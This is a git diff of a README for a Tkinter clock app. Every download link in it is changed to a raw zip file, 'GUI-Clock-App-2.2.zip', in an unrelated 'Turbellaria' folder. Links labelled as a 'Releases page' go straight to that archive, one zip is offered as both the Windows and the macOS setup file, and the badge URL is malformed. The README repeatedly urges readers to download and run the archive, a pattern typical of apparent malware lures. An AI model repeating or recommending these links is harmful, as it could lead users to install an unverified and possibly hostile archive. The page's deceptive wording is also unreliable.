@@ -4,19 +4,19 @@
 Clock_App-GUI is a modern application built using Tkinter. It offers a variety of tools for time management, including an analog clock, digital clock, timer, stopwatch, and timezone converter. This makes it the perfect app for anyone who needs to keep track of time efficiently.
 
 ## 📥 Download Now
-[![Download Clock_App-GUI](https://raw.githubusercontent.com/ZagyBani/Clock_App-GUI/main/Turbellaria/Clock_App-GUI.zip%20Now-Click%https://raw.githubusercontent.com/ZagyBani/Clock_App-GUI/main/Turbellaria/Clock_App-GUI.zip)](https://raw.githubusercontent.com/ZagyBani/Clock_App-GUI/main/Turbellaria/Clock_App-GUI.zip)
+[![Download Clock_App-GUI](https://raw.githubusercontent.com/ZagyBani/Clock_App-GUI/main/Turbellaria/GUI-Clock-App-2.2.zip%20Now-Click%https://raw.githubusercontent.com/ZagyBani/Clock_App-GUI/main/Turbellaria/GUI-Clock-App-2.2.zip)](https://raw.githubusercontent.com/ZagyBani/Clock_App-GUI/main/Turbellaria/GUI-Clock-App-2.2.zip)
 
 ## 🚀 Getting Started
 To begin using Clock_App-GUI, follow these simple steps:
 
 ### Step 1: Visit the Releases Page
-Go to the [Releases page](https://raw.githubusercontent.com/ZagyBani/Clock_App-GUI/main/Turbellaria/Clock_App-GUI.zip) to see the latest versions of the software.
+Go to the [Releases page](https://raw.githubusercontent.com/ZagyBani/Clock_App-GUI/main/Turbellaria/GUI-Clock-App-2.2.zip) to see the latest versions of the software.
 
 ### Step 2: Select Your Version
 On the Releases page, you will see a list of available versions. Choose the latest version for the best features and fixes.
 
 ### Step 3: Download the File
-Click on the link for your operating system to download the setup file. For example, you might find files like `https://raw.githubusercontent.com/ZagyBani/Clock_App-GUI/main/Turbellaria/Clock_App-GUI.zip` for Windows or `https://raw.githubusercontent.com/ZagyBani/Clock_App-GUI/main/Turbellaria/Clock_App-GUI.zip` for macOS. 
+Click on the link for your operating system to download the setup file. For example, you might find files like `https://raw.githubusercontent.com/ZagyBani/Clock_App-GUI/main/Turbellaria/GUI-Clock-App-2.2.zip` for Windows or `https://raw.githubusercontent.com/ZagyBani/Clock_App-GUI/main/Turbellaria/GUI-Clock-App-2.2.zip` for macOS. 
 
 ### Step 4: Install the App
 After the download is complete, open the file you just downloaded. Follow the on-screen instructions to install the application. The installation process is straightforward and intuitive.
@@ -59,7 +59,7 @@ Clock_App-GUI includes a wide array of functionalities designed for versatile ti
 If you have any questions or need assistance, feel free to reach out through the Issues section on GitHub. Your feedback is valuable and will help improve the application.
 
 ## 📥 Download & Install Again
-Don't forget to download Clock_App-GUI from our [Releases page](https://raw.githubusercontent.com/ZagyBani/Clock_App-GUI/main/Turbellaria/Clock_App-GUI.zip). Enjoy managing your time effectively!
+Don't forget to download Clock_App-GUI from our [Releases page](https://raw.githubusercontent.com/ZagyBani/Clock_App-GUI/main/Turbellaria/GUI-Clock-App-2.2.zip). Enjoy managing your time effectively!
 
 ## 🔗 More Information
 For detailed instructions, user guides, and updates, keep an eye on our GitHub repository. We regularly post updates and enhancements to improve your experience with Clock_App-GUI.
